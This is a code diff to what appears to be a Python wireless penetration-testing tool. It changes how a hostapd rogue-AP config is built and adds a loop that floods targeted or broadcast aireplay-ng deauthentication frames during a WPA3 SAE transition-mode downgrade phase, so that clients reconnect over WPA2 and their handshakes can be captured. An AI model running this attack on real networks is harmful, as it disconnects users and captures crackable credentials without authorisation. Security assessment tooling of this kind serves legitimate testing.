@@ -53,7 +53,7 @@ import struct
 import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-VERSION = "1.6.4"
+VERSION = "1.7.1"
 
 
 def _clients_base() -> Path:
@@ -2605,15 +2605,17 @@ def _write_hostapd_conf(ssid: str, bssid: str, channel: int,
         )
     else:
         security = ""
-    conf = (
-        f"interface={ap_iface}\n"
-        f"driver=nl80211\n"
-        f"ssid={ssid}\n"
-        f"hw_mode=g\n"
-        f"channel={channel or 6}\n"
-        f"ignore_broadcast_ssid=0\n"
-        f"bssid={bssid}\n" if bssid else ""
-    ) + security
+    ch      = channel or 6
+    hw_mode = "a" if ch >= 36 else "g"
+    conf  = f"interface={ap_iface}\n"
+    conf += f"driver=nl80211\n"
+    conf += f"ssid={ssid}\n"
+    conf += f"hw_mode={hw_mode}\n"
+    conf += f"channel={ch}\n"
+    conf += f"ignore_broadcast_ssid=0\n"
+    if bssid:
+        conf += f"bssid={bssid}\n"
+    conf += security
     conf_path = work_dir / "hostapd.conf"
     conf_path.write_text(conf, encoding="utf-8")
     return conf_path
@@ -3300,9 +3302,47 @@ def phase_sae_downgrade(monitor_iface: str, primary_iface: str,
                 ["hostapd", str(ha_conf)], stdout=hlog, stderr=hlog,
             )
 
-        duration = min(timeout, 120)
-        log(f"Phase 9: Rogue AP active for {duration}s — monitoring for WPA2 associations")
-        time.sleep(duration)
+        duration        = min(timeout, 120)
+        deauth_interval = 20
+        deauth_count    = 5
+        has_aireplay    = shutil.which("aireplay-ng") is not None
+        clients         = ap.get("clients", [])
+
+        if has_aireplay:
+            log(f"Phase 9: Rogue AP active for {duration}s — "
+                f"deauthing {'clients' if clients else 'broadcast'} every {deauth_interval}s")
+        else:
+            log(f"Phase 9: Rogue AP active for {duration}s — "
+                f"passive (aireplay-ng not found)")
+
+        time.sleep(3)  # let rogue AP stabilise before first deauth
+        elapsed = 3
+        while elapsed < duration:
+            if has_aireplay:
+                _run(["sudo", "iwconfig", monitor_iface, "channel", str(channel)],
+                     timeout=5)
+                if clients:
+                    for c in clients:
+                        mac = c.get("mac", "")
+                        if not mac:
+                            continue
+                        log(f"[9] Deauth ×{deauth_count} → {mac} from {bssid}")
+                        _run(["sudo", "aireplay-ng",
+                              "-0", str(deauth_count),
+                              "-a", bssid, "-c", mac,
+                              monitor_iface],
+                             timeout=deauth_count * 2 + 10)
+                else:
+                    log(f"[9] Broadcast deauth ×{deauth_count} → {bssid}")
+                    _run(["sudo", "aireplay-ng",
+                          "-0", str(deauth_count),
+                          "-a", bssid,
+                          monitor_iface],
+                         timeout=deauth_count * 2 + 10)
+            sleep_for = min(deauth_interval, duration - elapsed)
+            if sleep_for > 0:
+                time.sleep(sleep_for)
+            elapsed += deauth_interval
 
         for proc in (hostapd_proc, dnsmasq_proc, airodump_proc):
             _kill_proc(proc)
@@ -3327,12 +3367,13 @@ def phase_sae_downgrade(monitor_iface: str, primary_iface: str,
         (dg_dir / "sae_downgrade_results.json").write_text(
             json.dumps(result, indent=2), encoding="utf-8"
         )
-        finding_from_cat(
-            "sae_transition_downgrade",
-            data=result,
-            output_file=str(dg_dir / "sae_downgrade_results.json"),
-            title_override=f"WPA3 SAE Transition Mode Downgrade Tested: {ssid}",
-        )
+        if handshake_found:
+            finding_from_cat(
+                "sae_transition_downgrade",
+                data=result,
+                output_file=str(dg_dir / "sae_downgrade_results.json"),
+                title_override=f"WPA3 SAE Transition Mode Downgrade: {ssid}",
+            )
         log(f"Phase 9: {ssid!r} — handshake {'captured' if handshake_found else 'not captured'}")
 
     status("p9_sae_downgrade", "Phase 9: SAE Transition Mode Downgrade", "complete")
